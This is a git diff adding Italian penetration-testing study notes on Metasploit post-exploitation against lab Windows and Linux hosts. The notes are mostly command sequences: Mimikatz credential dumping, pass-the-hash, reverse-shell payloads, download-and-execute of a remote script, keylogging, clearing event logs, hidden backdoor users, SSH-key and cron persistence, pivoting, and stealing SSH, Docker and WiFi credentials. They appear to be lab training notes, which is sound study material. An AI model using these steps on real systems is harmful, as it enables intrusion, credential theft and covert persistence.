@@ -1436,3 +1436,604 @@ cd Users
 cd Administrator
 dir //ora abbiamo accesso alla cartella Administrator
 ```
+
+### Dumping Hashes with Mimikatz
+
+#### Kiwi module
+
+Kiwi è una built-in meterpreter extension.
+
+```
+load kiwi
+?
+creds_all
+lsa_dump_sam
+lsa_dump_secrets
+```
+
+#### Mimikatz <a href="#mimikatz" id="mimikatz"></a>
+
+Mimikatz è un eseguibile che bisogna avere sulla macchina target. Kali Linux lo mette già a disposizione nella cartella /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+
+Dalla meterpreter session:
+
+```
+pwd 
+cd C:\\
+mkdir Temp
+cd Temp
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+shell
+dir
+.\mimikatz.exe
+privilege::debug // se "20 OK" allora abbiamo i permessi per eseguire hash extraction from memory
+sekurlsa::logonpasswords // se presenti in memoria le password usate nei login
+lsadump::sam //ci restituisce SysKey, SAMKey, NTLM degli utenti, RID
+lsadump::secrets
+```
+
+### Pass-the-Hash With PSExec
+
+```
+search psexec
+use exploit/windows/smb/psexec
+set payload windows/x64/meterpreter/reverse_tcp
+show options //la porta 445 va bene per SMB, e dovremo inserire gli hash come User e Password
+set SMBUser Administrator
+set SMBPass <LM HASH>:<NTLM Hash>
+exploit
+sysinfo
+getuid
+CTRL+Z
+sessions
+```
+
+### Establishing Persistence On Windows
+
+{% hint style="info" %}
+Per poter stabilire persistenza sul sistema necessitiamo di un accesso come utente amministratore!
+
+Quindi: prima privilege escalation e poi persistence
+{% endhint %}
+
+#### Persistence Service
+
+```
+search platform:windows persistence
+use exploit/windows/local/persistence_service
+set payload windows/x64/meterpreter/reverse_tcp
+show options
+// è possibile impostare SERVICE_NAME per camuffare il servizio con un nome non sospetto, oppure impostare anche REMOTE_EXE_PATH e REMOTE_EXE_NAME
+set SESSION 1
+// possiamo modificare LPORT. Non verrà creata automaticamente una sessione, 
+// ma ci dà la possibilità di rimanere a disposizione per quando creeremo un handler su quella LPORT
+run
+set payload windows/meterpreter/reverse_tcp //perché supporta solo il staged payload a 32bit
+exploit
+getuid
+exit
+```
+
+#### Riavere accesso al target tramite il servizio persistente:
+
+```
+sessions
+sessions -K //termina tutte le sessioni
+use multi/handler
+set payload windows/meterrpeter/reverse_tcp //lo stesso payload usato per creare la persistenza con il modulo persistence_service
+show options
+set LHOST eth1
+set LPORT 4444 //la stessa porta usata per creare la persistenza
+run
+exit
+run
+sysinfo
+getuid
+```
+
+### Enabling RDP
+
+```
+search enable_rdp
+use post/windows/manage/enable_rdp
+show options
+// è possibile impostare la PASSWORD per un nuovo utente da usare per RDP, 
+// ma nel nostro caso cambieremo la password dell'utente NT AUTHORITY\SYSTEM 
+// con il quale ci eravamo loggati via exploit BadBlue
+// L'opzione FORWARD è utile per i casi di pivoting
+set SESSION 1
+exploit
+db_nmap -p 3389 10.2.19.254 //controlliamo che RDP sia attivo e aperto
+```
+
+#### Cambiare password per accedere via RDP
+
+Questo è sconsigliato in casi reali perché ovviamente bloccherebbe fuori l'amministratore e sarebbe un chiaro segnale che il sistema è stato hackerato. In casi di standard penetration test meglio usare un altro utente differente creandolo con il modulo MSF enable\_rdp, talvolta è necessario anche aggiungerlo al gruppo Administrators.
+
+```
+sessions 1
+shell
+net users
+net user Administrator hacker_123321
+CTRL+C
+```
+
+#### Accesso via RDP (da Kali Linux)
+
+```
+xfreerdp /u:administrator /p:hacker_123321 /v:10.2.19.254
+```
+
+### Keylogging (in Meterpreter)
+
+```
+help
+keyscan_start //avvia il keylogging
+keyscan_dump //mostra il log dei tasti sniffati: <Shift> è il maiuscolo, <^H> è backspace, ecc...
+//se dovessimo avere problemi nel dump possiamo riavviare il servizio:
+keyscan_stop
+keyscan_start
+keyscan_dump
+//keyboard_send e keyevent sono ridondanti se abbiamo già accesso al target via meterpreter, i comandi li possiamo inviare direttamente da qui.
+```
+
+### Clearing Windows Event Logs
+
+```
+//Dentro meterpreter
+clearev
+//è importante anche eliminare (con il comando rm) eventuali file malevoli caricati sul sistema
+```
+
+{% hint style="warning" %}
+è necessario avere permessi amministrativi per poter pulire il Windows Event Log!
+{% endhint %}
+
+### Pivoting
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Una volta exploitato e avuto accesso a Victim 1 possiamo fare pivoting verso la rete interna a cui appartiene Victim 1, che ci permette di raggiungere Victim 2.
+
+Utilizziamo la sessione meterrpeter su Victim 1 per accedere a Victim 2, passando effettivamente per Victim 1 altrimenti da Attacker non riusciremmo a raggiungere Victim 2.
+
+#### Exploitiamo la prima vittima (Victim 1)
+
+```
+service postgresql start && msfconsole
+workspace -a pivoting
+db_nmap -sV 10.2.27.1 //Victim1
+search rejetto
+use exploit/windows/http/rejetto_hfs_exec
+show options
+set RHOSTS 10.2.27.1 //Victim1
+exploit
+```
+
+#### Facciamo pivoting verso Victim2
+
+```
+//Listiamo le interfacce di rete di Victim1 e individuiamo qual è la rete interna sulla quale si trova Victim 2
+ipconfig
+run autoroute -s 10.2.27.0/20 //impostiamo l'autoroute sulla rete a cui appartiene l'IP di Victim1, che è la stessa rete di Victim2
+//ora possiamo accedere a questa sottorete via msfconsole attraverso la sessione meterpreter che lasciamo attiva su Victim1
+background
+sessions
+sessions -n victim-1 -i 1 //rinominiamo la sessione per non confonderci
+sessions
+```
+
+#### Enumeriamo Victim2
+
+{% hint style="warning" %}
+Attenzione: non possiamo usare nmap o strumenti esterni per scannerizzare la sottorete perché il routing funziona solo con Metasploit Framework ed i suoi moduli
+{% endhint %}
+
+```
+//Usiamo portscan module per scannerizzare la rete che abbiamo aggiunto con autoroute
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 10.2.27.187 //Victim2
+set PORTS 1-100 //per risparmiare un po' di tempo limitiamo le porte, a piacimento
+exploit
+```
+
+Se vogliamo fare un nmap scan ad esempio, avremo bisogno di impostare un port forwarding della porta 80 di Victim2 su una porta locale della nostra istanza Kali Linux, per impostarlo dobbiamo farlo nella sessione meterpreter di Victim1.
+
+#### Portforwarding della porta 80 di Victim2 <a href="#portforwarding-della-porta-80-di-victim2" id="portforwarding-della-porta-80-di-victim2"></a>
+
+Impostiamo un port forwarding della porta 80 di Victim2 su una porta locale della nostra istanza Kali Linux, per impostarlo dobbiamo farlo nella sessione meterpreter di Victim1.
+
+```
+sessions 1
+portfwd add -l 1234 -p 80 -r 10.2.27.187 //facciamo forward della porta 80 di Victim2 sulla 1234 locale (Kali)
+background
+```
+
+#### Enumeration ed exploitation del servizio di Victim2 tramite port forwarding
+
+Ora possiamo fare lo scan del servizio running sulla porta 80 di Victim2 con gli strumenti di Kali come Nmap effettuando lo scan sulla porta 1234 locale.
+
+```
+db_nmap -sS -sV -p 1234 localhost
+search badblue
+use exploit/windows/http/badblue_passthru
+set payload windows/meterpreter/bind_tcp //perché una reverse connection non sarebbe possibile
+show options
+set RHOSTS 10.2.27.187
+set LPORT 4433
+exploit
+sysinfo
+background
+sessions
+sessions -n victim-2 -i 2
+sessions
+sessions 2
+sysinfo
+background
+sessions 1
+sysinfo
+```
+
+***
+
+## Linux Post Exploitation
+
+### Moduli utili per Post Exploitation Linux
+
+#### Comandi utili per Local enumeration
+
+```
+shell
+/bin/bash -i
+whoami
+cat /etc/passwd //listare account sul sistema
+groups root // vedere i gruppi ai quali l'utente usato fa parte
+cat /etc/*issue //Versione OS
+uname -r //versione kernel
+uname -a //hostname, versione kernel e info aggiuntive
+ifconfig 
+ip a s //network enumeration delle interfaccie sul sistema
+netstat -antp //listare servizi che ascoltano sulle porte aperte
+ps aux //processi sul sistema
+env //variabili d'ambiente dell'utente
+CTRL+C
+sessions-u 1
+sessions
+```
+
+#### Elenca le configurazioni Linux
+
+```
+search enum_configs
+show options
+set SESSION 3
+run
+//Tutti i file di configurazione che non danno errore vengono salvati nel DB
+loot // Mostra tutti i file di configurazione salvati nel DB con un nome che spiega cos'è
+cat /root/.msf4/loot /20211126230647_Linux_PE_......txt //faccio il cat ad esempio del file delle shell sul sistema
+```
+
+#### Environment Variables
+
+```
+search env platform:linux
+use post/multi/gather/env
+show options
+set SESSION 3
+run
+```
+
+#### Network information
+
+Raccoglie informazioni come ssh, routing table, network config, firewall config, DNS, if-up/if-down...
+
+```
+search enum_network
+use post/linux/gather/enum
+set SESSION 3
+run
+loot
+```
+
+Ad esempio con il file delle configurazioni DNS capiamo che il server è hostato in cloud su linode, quindi è una info in più.
+
+#### Sistemi di protezione: security features abilitate (hardening)
+
+```
+search enum_protections
+use post/linux/gather/enum_protections
+info
+set SESSION 3
+run
+notes //le info sono state salvate in notes
+```
+
+#### Informazioni sul sistema
+
+```
+search enum_system
+use post/linux/gather/enum_system
+show options
+info
+set SESSION 3
+run
+loot
+```
+
+#### Check VM
+
+```
+search checkvm
+use post/linux/gather/checkvm
+show options
+set SESSION 3
+run
+```
+
+#### Check Docker
+
+```
+search checkcontainer
+use post/linux/gather/checkcontainer
+show options
+set SESSION 3
+run
+```
+
+#### Enum user history
+
+Va a identificare tutti i file con la history dei comandi di tutti gli account, sia quelli di user account che i service account.
+
+```
+search enum_user_history
+use post/linux/gather/enum_users_history
+set SESSION 3
+run
+loot
+//cat file bash history di root
+```
+
+#### Enum network information
+
+```
+use post/linux/gather/enum_network
+set SESSION 1
+run
+```
+
+#### Multi Manage System Remote TCP Shell Session
+
+This module will create a Reverse TCP Shell on the target system using the system's own scripting environments installed on the target.
+
+```
+use post/multi/manage/system_session
+set SESSION 1
+set TYPE python
+set HANDLER true
+set LHOST 192.216.221.2
+run
+```
+
+Now, let’s create a bash file which will create a user on the target machine by uploading a test.sh file and execute it.
+
+```
+useradd hacker
+useradd test
+useradd nick
+```
+
+Now, let’s run the Apache server on the attacker’s machine and copy the test.sh file in the root folder.
+
+```
+/etc/init.d/apache2 start
+cp test.sh /var/www/html
+```
+
+#### Download exec
+
+```
+use post/linux/manage/download_exec
+set URL http://192.216.221.2/test.sh
+set SESSION 1
+run
+```
+
+#### Credenziali SSH
+
+```
+use post/multi/gather/ssh_creds
+set SESSION 1
+run
+```
+
+#### Credenziali Docker
+
+```
+use post/multi/gather/docker_creds
+set SESSION 1
+run
+```
+
+#### Hashdump
+
+```
+use post/linux/gather/hashdump
+set SESSION 1
+set VERBOSE true
+run
+```
+
+#### Gather eCryptfs Metadata
+
+This module will collect the contents of all users' .ecrypts directories on the targeted machine. Collected "wrapped-passphrase" files can be cracked with John the Ripper (JtR) to recover "mount passphrases".
+
+```
+use post/linux/gather/ecryptfs_creds
+set SESSION 1
+run
+```
+
+#### Linux Gather NetworkManager 802-11-Wireless-Security Credentials&#xD;
+
+This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from Linux NetworkManager connection configuration files.
+
+```
+use post/linux/gather/enum_psk
+set SESSION 1
+run
+```
+
+#### Phpmyadmin credentials stealer
+
+```
+use post/linux/gather/phpmyadmin_credsteal
+set SESSION 1
+run
+```
+
+### Privilege Escalation: Exploiting a vulnerable program
+
+```
+ps aux //per vedere se ci sono processi di root
+cat /bin/check-down //il contenuto ci dice che un file chkrootkit è eseguito ogni 60 secondi
+chkrootkit --help  //Chkrootkit è una utility linux che cerca su linux dei rootkit, è un anti rootkit.
+chkrootkit -V //è 0.49, versione vulnerabile
+CTRL+C
+CTRL+Z
+search chkrootkit
+use exploit/unix/local/chkrootkit
+show options
+info
+set CHKROOTKIT /bin/chkrootkit //perché linux riesce ad identificare il binary vero attuale
+set SESSION 2
+set LHOST 192.124.219.2
+show options
+sessions  //per controllare che non usiammo la porta presente in LPORT
+exploit //crea un crontab per attendere che venga eseguito chkrootkit dal cron
+/bin/bash -i
+whoami //abbiamo ora root privileges
+```
+
+### Dumping Hashes with Hashmap
+
+```
+search hashdump
+use post/linux/gather/hashdump
+show options
+set SESSION 3
+run
+loot
+cat <passwd>
+cat <shadowfile> //non contiene le password ma asterischi perché le password di quegli account non sono state configurate
+sessions 3
+shell
+/bin/bash -i
+passwd root //cambiamo la password di root
+useradd -m alexis -s /bin/bash //aggiungiamo un nuovo utente
+passwd alexis
+CTRL+Z
+run //ora il modulo ci restituisce utente:hashpassword:UID:GID::homedirectory:
+cat <newunshadowedfile>
+//nell'hash della password i primi 3 caratteri come ad esempio $6$ indicano il tipo di algoritmo di hash utilizzato,
+// in particolare più è alto il numero più è sicuro. $6$ è sha512
+```
+
+L'unica cosa che possiamo fare con gli hash è craccarli se possibile, se le password sono semplici. Non si può fare molto altro anche perché per avere gli hash devi già essere utente root quindi ormai non serve più autenticarsi come altri.
+
+### Establishing Persistence On Linux
+
+#### Creare un backdoor user per avere accesso a piacere
+
+```
+bash
+/bin/bash -i
+cat /etc/passwd //per vedere quali utenti esistono sul sistema
+//l'utente creato dovrebbe nascondersi ed essere difficile da individuare, quindi simile a un service account
+useradd -m /var/www/html ftp -s /bin/sbin/nologin //specifichiamo la home directory come /var/www ma non è necessario, possiamo lasciare vuoto. Poi il nome utente (ftp) e infine con -s impostiamo l'actual terminal session (in questo caso è quella data agli user service, per nasconderci meglio.
+passwd ftp //impostiamo la password di ftp
+groups root
+usermod -aG root ftp //aggiungiamo ftp al gruppo root
+groups ftp
+usermod -u 15 ftp //per modificare l'id dell'utente per non far capire che lo abbiamo creato manualmente
+```
+
+#### SSH Key Persistence
+
+Metodo consigliato per garantire persistenza. Questo metodo è difficile da individuare perché la chiave pubblica SSH che è stata aggiunta nella home directory dell'utente non è qualcosa che è acceduta spesso. Quindi è difficile che l'utente se ne accorga.
+
+```
+use post/linux/manage/sshkey_persistence
+show options
+set CREATESSHFOLDER true //perché in alcuni casi l'utente potrebbe non avere la cartella per SSH già presente
+set SESSION 4
+info
+exploit //ha creato le chiavi ssh per tutti gli utenti, inclusi i service users.
+loot //per trovare la private key che ci ha generato e salvato in un file
+cat <FilePrivateKey>
+//copiamo la chiave e la utilizziamo per accedere
+exit -y
+vim ssh_key // e incolliamo la chiave privata in questo file
+chmod 0400 ssh_key
+ssh -i ssh_key root@192.182.80.3 //<target ip address>
+//abbiamo ora accesso al target come root e senza dover fornire password
+ls
+whoami
+exit
+ssh -i ssh_key ftp@192.182.80.3 // e funziona anche per accedere all'utente ftp
+```
+
+#### APT Package Manager Persistence Module
+
+```
+use exploit/linux/local/apt_package_manager_persistence
+show options
+info
+// Ma in questo caso dobbiamo fare affidamento sul fatto che venga eseguito il packet manager, non potremmo connetterci quando vogliamo.
+```
+
+#### Cron Persistence Module
+
+Crea un cronjob che costantemente tenta di connettersi ad un nostro handler che dovremmo predisporre in ascolto.
+
+I cronjobs possono essere però facilmente visti e cancellati da un amministratore legittimo.
+
+```
+use exploit/linux/local/cron_persistence
+show options
+set SESSION 4
+set LPORT 4422
+set LHOST 192.182.80.2 //(eth1)
+exploit //ma pare non funzioni
+```
+
+#### Service Persistence Module
+
+Crea un servizio e lo marca come auto-restart. Ma è valido solo per alcune versioni di OS e bisogna avere permessi sufficienti
+
+```
+use exploit/linux/local/service_persistence
+show options
+set SESSION 4
+set payload cmd/unix/reverse_python
+show options
+set LHOST 192.182.80.2
+set LPORT 4422
+exploit //in questo caso fallisce
+set target 3 //per settare a systemd invece che system V
+exploit // funziona parzliamente, non crea la sessione
+set target 4 //proviamo con systemd user
+exploit // anche in questo caso non crea la sessione
+```
+
+### Metasploit GUI: Armitage
+
+è possibile utilizzare Armitage, che è la GUI di Metasploit. Per far ciò bisogna prima avviare il DB Postgresql usato da Metasploit Framework.
+
+```
+service postgresql start && msfconsole
+db_status
+//in un secondo tab:
+armitage
+```
+
+Comodo per fare Pivoting visualizzando quello che si sta facendo, inoltre le autoroute vengono impostate in maniera più veloce via interfaccia grafica. Per dettagli vedere il capitolo "Metasploit GUIs" all'interno di "Post Exploitation".
